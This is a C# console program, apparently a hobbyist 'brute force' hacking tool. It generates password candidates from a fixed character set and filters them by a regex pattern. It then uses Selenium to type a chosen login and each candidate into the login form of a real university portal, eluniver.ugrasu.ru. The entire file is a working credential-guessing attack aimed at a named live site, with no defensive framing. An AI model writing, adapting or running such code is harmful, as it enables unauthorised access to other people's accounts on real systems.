using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System.Threading;
using System.IO;
using System.Text.RegularExpressions;

namespace BruteForceApp
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\tWelcome to BRUTE FORCE");
            Console.WriteLine("\tThis program was crated by rozxckyyy\n");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\t1. Hacking without Brute Force (if the SortPasswords.txt file is already filled with passwords)");
            Console.WriteLine("\t2. Hacking with Brute Force");
            Console.WriteLine("\t3. Exit the program\n");
            Console.Write("\tSelect an item: ");
            string item = Console.ReadLine();

            var enumeration = new Program();


            if (item == "1") { enumeration.WithEnumeration(); }
            else if (item == "2") { enumeration.WithoutEnumeration(); }
            else if (item == "3") { Environment.Exit(0); }
        }

        public void WithEnumeration()
        {
            Console.Write("\n\tEnter login: ");
            string login = Console.ReadLine();
            Console.WriteLine("\n\tThe search for password combinations has begun. Wait");

            List<string> SortPass = new List<string>();

            string pathAllPasswords = @"AllPasswords.txt";
            string pathSortPasswords = @"SortPasswords.txt";
            var password = "Gfc857";
            var q = password.Select(x => x.ToString());
            int size = 6;

            for (int i = 0; i < size - 1; i++) //Permutation cycle
            {
                q = q.SelectMany(x => password, (x, y) => x + y);
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n\tThe search combination is over");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\n\tStarted writing password combinations to AllPasswords.txt");

            using (StreamWriter writer = new StreamWriter(pathAllPasswords, false)) //Writing permutations in AllPasswords.txt
            {
                foreach (var item in q)
                {
                    writer.WriteLine(item);
                }
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n\tEntry in AllPasswords.txt Completed");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\n\tAdding password combinations to the list");

            using (StreamReader sr = new StreamReader(pathAllPasswords)) //Reading from AllPasswords.txt and adding to the SortPass list
            {
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    SortPass.Add(line);
                }
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n\tList is full");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\n\tSorting of passwords by pattern has begun");

            using (StreamWriter writer = new StreamWriter(pathSortPasswords, false)) //Writing passwords in SortPasswords.txt
            {
                foreach (var i in SortPass)
                {
                    if (Regex.IsMatch(i.ToString(), @"([A-Z]{1}[a-z]{2}\d{3})"))
                    {
                        writer.WriteLine(i);
                    }
                }
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n\tPasswords sorted");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\n\t1. Start hacking");
            Console.WriteLine("\t2. Close the program\n");
            Console.Write("\tSelect an item: ");
            string itm = Console.ReadLine();

            if (itm == "1") 
            {
                IWebDriver driver = new ChromeDriver();
                driver.Manage().Window.Maximize();
                driver.Navigate().GoToUrl("https://eluniver.ugrasu.ru/login/index.php");

                using (StreamReader sr = new StreamReader(pathSortPasswords)) //Reading from SortPasswords.txt to a website
                {
                    string pass;
                    while ((pass = sr.ReadLine()) != null)
                    {
                        Thread.Sleep(2000);
                        driver.FindElement(By.XPath("/html/body/div[2]/div[5]/div/div/div/div/div/section/div/div/div[1]/div[2]/form/div[1]/div[1]/input")).SendKeys(login);
                        Thread.Sleep(100);
                        driver.FindElement(By.XPath("/html/body/div[2]/div[5]/div/div/div/div/div/section/div/div/div[1]/div[2]/form/div[1]/div[3]/input")).SendKeys(pass);
                        Thread.Sleep(100);
                        driver.FindElement(By.XPath("/html/body/div[2]/div[5]/div/div/div/div/div/section/div/div/div[1]/div[2]/form/div[5]/div[1]/input[3]")).Click();
                    }
                }
            }
            else if (itm == "2") { Environment.Exit(0); }
        }

        public void WithoutEnumeration()
        {
            Console.Write("\n\tEnter login: ");
            string login = Console.ReadLine();

            string pathSortPasswords = @"SortPasswords.txt";

            IWebDriver driver = new ChromeDriver();
            driver.Manage().Window.Maximize();
            driver.Navigate().GoToUrl("https://eluniver.ugrasu.ru/login/index.php");

            using (StreamReader sr = new StreamReader(pathSortPasswords)) //Reading from SortPasswords.txt to a website
            {
                string pass;
                while ((pass = sr.ReadLine()) != null)
                {
                    Thread.Sleep(2000);
                    driver.FindElement(By.XPath("/html/body/div[2]/div[5]/div/div/div/div/div/section/div/div/div[1]/div[2]/form/div[1]/div[1]/input")).SendKeys(login);
                    Thread.Sleep(100);
                    driver.FindElement(By.XPath("/html/body/div[2]/div[5]/div/div/div/div/div/section/div/div/div[1]/div[2]/form/div[1]/div[3]/input")).SendKeys(pass);
                    Thread.Sleep(100);
                    driver.FindElement(By.XPath("/html/body/div[2]/div[5]/div/div/div/div/div/section/div/div/div[1]/div[2]/form/div[5]/div[1]/input[3]")).Click();
                }
            }
        }
    }
}